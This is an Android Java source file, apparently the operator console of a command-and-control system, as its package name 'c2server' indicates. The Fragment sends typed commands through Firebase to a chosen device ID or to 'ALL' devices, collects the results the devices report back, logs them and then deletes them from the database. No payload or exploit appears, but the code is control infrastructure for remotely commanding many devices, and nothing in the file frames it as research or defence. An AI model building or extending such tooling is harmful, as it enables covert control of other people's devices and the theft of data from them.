package com.enterprise.c2server;

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import com.google.firebase.database.*;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class CommandFragment extends Fragment {

    private EditText cmdInput, targetInput;
    private Button sendBtn;
    private RecyclerView logRecycler;
    private CommandLogAdapter logAdapter;
    private DatabaseReference commandsRef, resultsRef;

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_command, container, false);

        cmdInput = view.findViewById(R.id.cmdInput);
        targetInput = view.findViewById(R.id.targetInput);
        sendBtn = view.findViewById(R.id.sendBtn);
        logRecycler = view.findViewById(R.id.logRecycler);

        logAdapter = new CommandLogAdapter();
        logRecycler.setLayoutManager(new LinearLayoutManager(getContext()));
        logRecycler.setAdapter(logAdapter);

        commandsRef = FirebaseDatabase.getInstance().getReference("commands");
        resultsRef = FirebaseDatabase.getInstance().getReference("results");

        sendBtn.setOnClickListener(v -> {
            String cmd = cmdInput.getText().toString().trim();
            String target = targetInput.getText().toString().trim();
            if (target.isEmpty()) target = "ALL";

            if (!cmd.isEmpty()) {
                commandsRef.child(target).setValue(cmd);
                String time = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
                logAdapter.addLog("📤 [" + time + "] → " + target + ": " + cmd);
                cmdInput.setText("");
            }
        });

        resultsRef.addChildEventListener(new ChildEventListener() {
            @Override public void onChildAdded(@NonNull DataSnapshot snapshot, @Nullable String previousChildName) {
                String deviceId = snapshot.getKey();
                for (DataSnapshot resultSnap : snapshot.getChildren()) {
                    String cmd = resultSnap.child("command").getValue(String.class);
                    String result = resultSnap.child("result").getValue(String.class);
                    Long ts = resultSnap.child("timestamp").getValue(Long.class);
                    String time = ts != null ? new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date(ts)) : "??:??:??";
                    logAdapter.addLog("📥 [" + time + "] " + deviceId + ": " + result);
                }
                snapshot.getRef().removeValue();
            }
            @Override public void onChildChanged(@NonNull DataSnapshot snapshot, @Nullable String previousChildName) {}
            @Override public void onChildRemoved(@NonNull DataSnapshot snapshot) {}
            @Override public void onChildMoved(@NonNull DataSnapshot snapshot, @Nullable String previousChildName) {}
            @Override public void onCancelled(@NonNull DatabaseError error) {
                logAdapter.addLog("❌ Firebase error: " + error.getMessage());
            }
        });

        return view;
    }

    private static class CommandLogAdapter extends RecyclerView.Adapter<CommandLogAdapter.ViewHolder> {
        private final List<String> logs = new ArrayList<>();

        void addLog(String log) {
            logs.add(log);
            notifyItemInserted(logs.size() - 1);
        }

        @NonNull @Override
        public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
            TextView tv = new TextView(parent.getContext());
            tv.setTextSize(12);
            tv.setPadding(16, 8, 16, 8);
            tv.setTextColor(0xFF00FF00);
            tv.setBackgroundColor(0xFF1E1E1E);
            return new ViewHolder(tv);
        }

        @Override public void onBindViewHolder(@NonNull ViewHolder holder, int position) {
            ((TextView) holder.itemView).setText(logs.get(position));
        }

        @Override public int getItemCount() { return logs.size(); }

        static class ViewHolder extends RecyclerView.ViewHolder {
            ViewHolder(View v) { super(v); }
        }
    }
}
